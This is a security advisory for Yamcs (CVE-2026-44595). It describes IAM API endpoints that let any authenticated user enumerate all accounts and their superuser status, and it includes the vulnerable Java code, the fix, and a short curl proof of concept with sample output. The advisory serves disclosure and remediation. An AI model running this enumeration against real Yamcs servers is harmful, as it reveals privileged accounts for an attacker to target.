# [M] Yamcs vulnerable to unauthorized user enumeration via IAM API endpoints

## Summary
Severity: Medium
Advisory: GHSA-p2rj-mrmc-9w29
CVE: CVE-2026-44595
CWE: CWE-862
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-05-27
Source: https://github.com/advisories/GHSA-p2rj-mrmc-9w29
Type: github-advisory

## Affected
- Maven: `org.yamcs:yamcs-core` — affected >=0 <5.12.7

## Details
### Summary

The IAM API endpoints (`listUsers`, `getUser`, `listGroups`, and `getGroup`) in `yamcs-core` do not enforce the required `SystemPrivilege.ControlAccess` check. As a result, **any authenticated user** (even those with low or no privileges) can enumerate all user accounts in the system, including their usernames, superuser status, and group memberships.

This constitutes a broken access control vulnerability (CWE-862) that leaks sensitive user information.

### Root Cause

**File:** `yamcs-core/src/main/java/org/yamcs/http/api/IamApi.java:125,180,357,372`

`listUsers()`, `getUser()`, `listGroups()`, and `getGroup()` do not require `SystemPrivilege.ControlAccess`. Any authenticated user — regardless of privileges — can enumerate all users, their superuser status, and group memberships:

```java
// listUsers — NO checkSystemPrivilege
public void listUsers(Context ctx, Empty request, ...) {
    var sensitiveDetails = ctx.user.hasSystemPrivilege(SystemPrivilege.ControlAccess);
    // sensitiveDetails=false for low-priv users, but name/superuser/active still exposed
    for (User user : users) {
        UserInfo userb = toUserInfo(user, sensitiveDetails, directory);
        responseb.addUsers(userb);
    }
}
```

Compare with properly protected endpoints:

```java
// createUser — correctly protected
public void createUser(Context ctx, ...) {
    ctx.checkSystemPrivilege(SystemPrivilege.ControlAccess); // present
```

### Impact

Any authenticated user can:

1. List all user accounts in the system
2. Identify which accounts have superuser privileges
3. Use this information to target privileged accounts

### Proof of Concept

```bash
# Authenticate as any low-privilege user GET access_token
curl -s -X POST "http://localhost:8090/auth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&username=lowpriv&password=lowpriv123"

# Enumerate all users — no ControlAccess required
curl -s "http://TARGET:8090/api/users" \
  -H "Authorization: Bearer $TOKEN" #paste access_token
```

**Output (confirmed):**

```json
{
  "users": [
    { "name": "admin", "superuser": true, "active": true },
    { "name": "operator", "superuser": true, "active": true },
    { "name": "lowpriv", "superuser": false, "active": true }
  ]
}
```

### Fix

Add `ControlAccess` check to `listUsers`, `getUser`, `listGroups`, `getGroup`:

```java
public void listUsers(Context ctx, Empty request, ...) {
    ctx.checkSystemPrivilege(SystemPrivilege.ControlAccess); // ADD THIS
    ...
}
```

## References
- https://github.com/yamcs/yamcs/security/advisories/GHSA-p2rj-mrmc-9w29
- https://github.com/yamcs/yamcs
